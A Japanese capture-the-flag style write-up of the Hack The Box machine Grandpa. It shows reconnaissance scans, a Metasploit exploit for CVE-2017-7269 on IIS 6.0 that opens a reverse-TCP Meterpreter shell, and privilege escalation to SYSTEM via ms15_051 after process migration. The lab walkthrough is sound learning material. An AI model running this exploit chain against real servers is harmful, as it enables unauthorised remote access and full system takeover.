# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。  
主に記録用として記しています。  
Twitter:@yukitsukai_47  
# Grandpa
HackTheBox公式より  
![コメント 2020-05-25 204109.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b9eec01c-d09e-32fc-5837-520117c3e546.png)
Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited
CVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands
of IIS servers around the globe when it became public knowledge.

おじいちゃんはハック・ザ・ボックスのシンプルなマシンの一つですが、広く使われているマシンをカバーしています。
CVE-2017-7269。この脆弱性は悪用するには些細なことで、この脆弱性が公になったときに世界中の何千ものIISサーバへの即時アクセスを許してしまいます。

# スキャン
Grandpa(10.10.10.14)に対して、スキャンを行います。
まずnmapからスキャンを開始します。
## nmap 
```
nmap -sC -sV -oN grandpa 10.10.10.14
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力

```
# Nmap 7.80 scan initiated Mon May 25 07:16:41 2020 as: nmap -sC -sV -oN grandpa2 10.10.10.14
Nmap scan report for 10.10.10.14
Host is up (0.25s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Mon, 25 May 2020 11:19:33 GMT
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 25 07:17:09 2020 -- 1 IP address (1 host up) scanned in 28.69 seconds
```

ここでGrandpaは80番ポートがMicrosoft IIS httpd 6.0で動いていることが分かります。

## gobuster
次に80番ポートが空いていることが分かったので、gobusterを使ってディレクトリを列挙していきましょう。

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.14
```

- dirモード
- -w 単語リストの使用
- -u URLの指定

```
kali@kali:~$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.14
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.14
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/25 07:14:13 Starting gobuster
===============================================================
/images (Status: 301)
/Images (Status: 301)
/IMAGES (Status: 301)
===============================================================
2020/05/25 07:50:07 Finished
===============================================================
```

## Nikto
次はNiktoを使用してスキャンを行います。

```
kali@kali:~$ nikto --url 10.10.10.14
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2020-05-25 07:09:26 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPFIND PROPPATCH SEARCH LOCK UNLOCK MKCOL COPY listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8015 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2020-05-25 07:44:16 (GMT-4) (2090 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Hack The Boxの別のマシンであるGrannyでもOSVDB-397ついて列挙されていたので二つは同じ脆弱性を持っていると推測できます。
OSVDB-397についてGoogle先生に聞いてみます。  
<img width="765" alt="スクリーンショット 2020-05-25 0.30.47.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4666cd8e-08ed-e819-f24b-f87ba85a827d.png">

どうやらWebサーバには、リモートの攻撃者が任意のファイルをアップロードできる可能性のある欠陥が含まれているようです。

# 侵入
nmapの結果からGrandpaはMircrosoft IIS 6.0で動いていることが分かっています。
おそらくGrannyと同じWebDAV脆弱性を持っていると考えるため、Grannyに挑戦した時とは別の方法で攻略したいと思います。
前回、なぜかmetasploitのwindows/iis/iis_webdav_scstoragepathfromurlがうまく行かなかったので今回はそれを使おうと思います。
## searchsploit

```
kali@kali:~$ searchsploit IIS 6.0
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure    | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow             | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service               | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                        | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-0 | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow            | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                         | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                         | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                     | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                       | windows/remote/8765.php
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                            | windows/remote/19033.txt
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

## CVE-2017-7269(exploit/windows/iis/iis_webdav_scstoragepathfromurl)の利用

```
msf5 > search cve-2017-7269

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
RHOSTS => 10.10.10.14
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.14      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.20:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.20:4444 -> 10.10.10.14:1035) at 2020-05-25 07:23:07 -0400

meterpreter > 
```
今回は、metasploitで簡単にシェルを取ることができました。

# 特権エスカレーション
次に現在の権限では、user.txtを取ることはおろかgetuidすらできない状態なので、さらなる権限昇格を狙います。
権限昇格には、post/multi/recon/local_exploit_suggesterを使用し使えそうなものを探します。

```
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 31 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

ここでは、exploit/windows/local/ms15_051_client_copy_imageを利用してみます。

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
msf5 exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1
msf5 exploit(windows/local/ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.0.2.15:4444 
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf5 exploit(windows/local/ms15_051_client_copy_image) > set LHOST 10.10.14.20
LHOST => 10.10.14.20
msf5 exploit(windows/local/ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.10.14.20:4444 
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
[*] Exploit completed, but no session was created.
```

うまく作動しません。
migrateコマンドを使用して、別のプロセスに移動します。

```
msf5 exploit(windows/local/ms15_051_client_copy_image) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 272   4     smss.exe                                                        
 324   272   csrss.exe                                                       
 348   272   winlogon.exe                                                    
 396   348   services.exe                                                    
 400   1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 408   348   lsass.exe                                                       
 592   396   svchost.exe                                                     
 680   396   svchost.exe                                                     
 736   396   svchost.exe                                                     
 764   396   svchost.exe                                                     
 800   396   svchost.exe                                                     
 936   396   spoolsv.exe                                                     
 964   396   msdtc.exe                                                       
 1076  396   cisvc.exe                                                       
 1120  396   svchost.exe                                                     
 1180  396   inetinfo.exe                                                    
 1216  396   svchost.exe                                                     
 1328  396   VGAuthService.exe                                               
 1408  396   vmtoolsd.exe                                                    
 1460  396   svchost.exe                                                     
 1600  396   svchost.exe                                                     
 1708  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1916  396   dllhost.exe                                                     
 2152  1460  w3wp.exe                                                        
 2216  348   logon.scr                                                       
 2308  592   wmiprvse.exe                                                    
 2772  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3208  400   rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3932  1076  cidaemon.exe                                                    
 3976  1076  cidaemon.exe                                                    
 4016  1076  cidaemon.exe   
```

- 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE
- 2772  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE

この2つがNT AUTHORITY\NETWORK SERVICEで動いているので、migrateを用いてプロセスを移行します。

```                            
meterpreter > migrate 2772
[*] Migrating from 3208 to 2772...
[*] Migration completed successfully.
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/local/ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.10.14.20:4444 
[*] Launching notepad to host the exploit...
[+] Process 3376 launched.
[*] Reflectively injecting the exploit DLL into 3376...
[*] Injecting exploit into 3376...
[*] Exploit injected. Injecting payload into 3376...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.14.20:4444 -> 10.10.10.14:1038) at 2020-05-25 07:31:52 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

無事、NT AUTHORITY\SYSTEMが得られました。
お疲れ様でした。

